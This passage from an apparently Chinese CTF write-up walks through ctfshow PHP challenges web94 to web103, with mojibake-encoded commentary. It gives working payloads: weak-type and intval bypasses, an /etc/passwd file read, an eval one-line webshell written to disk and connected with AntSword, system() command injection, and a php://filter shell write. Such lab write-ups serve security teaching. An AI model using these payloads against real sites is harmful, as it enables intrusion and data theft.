ï¼å–å</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šé‡å¦å®š  ä¸èƒ½å­˜åœ¨0è¦æœ‰0      <code>?num=4476.0</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020200635294.png"></p><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:53:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;  <span class="comment">//å¼±ç±»å‹</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123; <span class="comment">//å¤šè¿‡æ»¤äº†.</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;   <span class="comment">//å­˜åœ¨0</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç‰¹æ®Šç¬¦å·ç»•è¿‡ï¼Œå¤šè¯•å‡ æ¬¡  <code>?num=+010574</code>    æˆ–è€… ç©ºæ ¼  <code>?num= 010574</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020201549938.png"></p><p>intvalä¼šå¯¹+ ï¼ˆè§£ç åå°±æ˜¯ç©ºæ ¼)æˆ–è€… ç©ºæ ¼å¼€å¤´çš„ä¼šä½œä¸ºåˆ é™¤æˆ–è€…æ­£æ•°æ¥å¤„ç†ï¼Œè¿”å›å€¼</p><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:21:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;  <span class="comment">//å¼±ç±»å‹æ¯”è¾ƒ</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]); <span class="comment">//é«˜äº®ç±»ä¼¼å°†æ–‡æœ¬æ•°æ®è¯»å…¥è¯†åˆ«å…³é”®å­—ï¼ŒåŠ å…¥cssæ ·å¼ï¼Œæ··åˆè¿›è¡Œè¾“å‡ºï¼Œå¾®å°æ¸²æŸ“å¼•æ“</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯»æ–‡ä»¶     <code>?u=/etc/passwd</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020202251760.png"></p><p>è®¿é—®ç»å¯¹è·¯å¾„å¾—åˆ°flag   &#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>ç›¸å¯¹è·¯å¾„      .&#x2F;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221021090232827.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221021090427703.png"></p><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:36:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))  <span class="comment">//a,bä¸åŒï¼Œmd5ç›¸åŒ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥æ•°ç»„ï¼Œmd5å¯¹æ•°ç»„è¿”å›ç›¸åŒçš„å€¼    <code>a[]=1&amp;b[]=2</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221021161052042.png"></p><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Notice: Undefined index: flag in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: flag in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: HTTP_FLAG in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 21:39:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;  <span class="comment">//getä¸å­˜åœ¨å®ç°å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè½¬æ¢æˆæ•°ç»„</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">//ç»“æœè¿”å›cookie</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">//è¦†ç›–ä¸Šé¢çš„</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GETä¸ºæ•°ç»„</span><br><span class="line">$_GET[&#x27;flag&#x27;]ä¸ºæ•°ç»„</span><br><span class="line">å€¼ä¸ºHTTP_FLAG  é«˜äº®</span><br><span class="line">$GETå€¼ä¸º$_POST    $_POST [&#x27;flag&#x27;]=flag</span><br><span class="line">$_GET=$_COOKIE</span><br><span class="line">$_GET[&#x27;flag&#x27;]=$_COOKIE[&#x27;flag&#x27;]</span><br><span class="line">$_GET[&#x27;flag&#x27;]=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221021162237396.png"></p><p>åœ¨GETä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œä¼ å…¥æ‰èƒ½è¿›å…¥åé¢çš„åˆ¤æ–­ï¼Œåœ¨postè®©HTTP_FLAG&#x3D;flagï¼Œé«˜äº®</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221021173945951.png"></p><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 22:36:12</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));  <span class="comment">//äº§ç”Ÿä¸€ä¸ªéšæœºæ•°</span></span><br><span class="line">&#125;  <span class="comment">//1--36ä¹‹é—´ç”Ÿæˆä¸€ä¸ªæ•°ç»„</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;  </span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>äºŒåˆ†æ³•ï¼Œæœ€å¤§æé™æ˜¯469</p><p>å†™å…¥ä¸€å¥è¯   <code>?n=234.php</code>       <code>content=&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221022133305954.png"></p><p>è¿æ¥èšå‰‘</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221022133423506.png"></p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-21 22:10:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);  <span class="comment">//å¿…é¡»èµ‹å€¼æ•°å­—ï¼Œèµ‹å€¼ä¼˜å…ˆçº§é«˜äºé€»è¾‘è¿ç®—</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v1 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v2 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v3 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">19</span></span><br></pre></td></tr></table></figure><blockquote><p>é¦–å…ˆv0è¿™é‡Œèµ‹å€¼æ˜¯å¤§äºé€»è¾‘è¿ç®—çš„ï¼Œæ‰€ä»¥åªè¦v1æ˜¯æ•°å­—ï¼Œv2v3æ˜¯å•¥éƒ½è¡Œ</p><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­é‡Œv2ä¸èƒ½æœ‰åˆ†å·ï¼ˆï¼›ï¼‰</p><p>ç¬¬äºŒä¸ªåˆ¤æ–­é‡Œv3å¿…é¡»æœ‰åˆ†å·ï¼ˆï¼›ï¼‰</p><p>æœ€åçš„evalé‡Œé¢æœ‰æ‹¬å·ç›´æ¥é—­åˆäº†ï¼Œç›´æ¥æ‰§è¡Œçš„è¯ä¸å¥½æ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨v2é‡Œé¢æŠŠåé¢çš„phpä»£ç ç›´æ¥è¿‡æ»¤æ‰</p></blockquote><p>æŸ¥çœ‹æ•°æ®ç±»å‹</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221022135308345.png"></p><p><code>?v1=1&amp;v2=system(&#39;ls&#39;)&amp;v3=;</code></p><p><code>?v1=1&amp;v2=system(&#39;tac ctfshow.php&#39;)&amp;v3=;</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221024195148103.png"></p><p><strong>0x2dæ˜¯-</strong></p><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-22 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;   ctfshowç±»</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v1 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v2 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v3 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">19</span></span><br></pre></td></tr></table></figure><p>åå°„ç±»</p><p>tostring  </p><p><code>?v1=1&amp;v2=echo NEW Reflectionclass&amp;v3=;</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221025193527812.png"></p><p>å‘ç°ä¸å¯¹ï¼Œæ¯”å¯¹å°‘äº†ä¸€ä½ï¼Œçˆ†ç ´</p><p>è¯•åˆ°5ï¼Œå°±æˆåŠŸäº†</p><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>); <span class="comment">//ä¸¤ä¸ªç»„æˆv4ï¼Œv3ä¸å½±å“v4çš„å€¼ï¼Œæ‰€ä»¥åªè¦æ»¡è¶³v2æ˜¯æ•°å­—å°±è¡Œ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;  <span class="comment">//å†™æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);   <span class="comment">//æäº¤ç¬¬ä¸‰ä½åé¢çš„æ•°å­—ï¼Œv2å¡«å……åé¢çš„ä¸¤ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);   <span class="comment">//é…åˆä¼ªåè®®</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v1 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v2 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v3 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure><p><a href="https://so.csdn.net/so/search?q=substr&spm=1001.2101.3001.7020">substr</a>() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œv2è¢«å»æ‰äº†å‰ä¸¤ä½å­—ç¬¦æ‰€ä»¥åˆ°æ—¶å€™ç»™v2å‰åŠ ä¸¤ä¸ªæ•°å­—    v2å…¨ä¸ºæ•°å­—ï¼Œè€ƒè™‘åˆ©ç”¨ä¼ªåè®®å†™å…¥</p><p>æ‰¾åˆ°ä¸€ä¸ªä»£ç base64ç¼–ç ååœ¨è½¬ä¸ºåå…­è¿›åˆ¶ä¸ºå…¨æ•°å­—</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);  <span class="comment">// PD89YGNhdCAqYDs=</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$b</span>);      <span class="comment">//ç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ï¼Œç›´æ¥ç”¨å»æ‰ï¼Œ=å’Œå¸¦ç€=çš„base64è§£ç å‡ºæ¥çš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚                 </span></span><br><span class="line">è¾“å‡º   <span class="number">5044383959474e6864434171594473</span></span><br><span class="line">å¸¦eçš„è¯ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œå¯ä»¥é€šè¿‡is_numericæ£€æµ‹ã€‚</span><br></pre></td></tr></table></figure><p><code>get:v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</code><br><code>post: v1=hex2bin</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221025205004109.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221025205205393.png"></p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 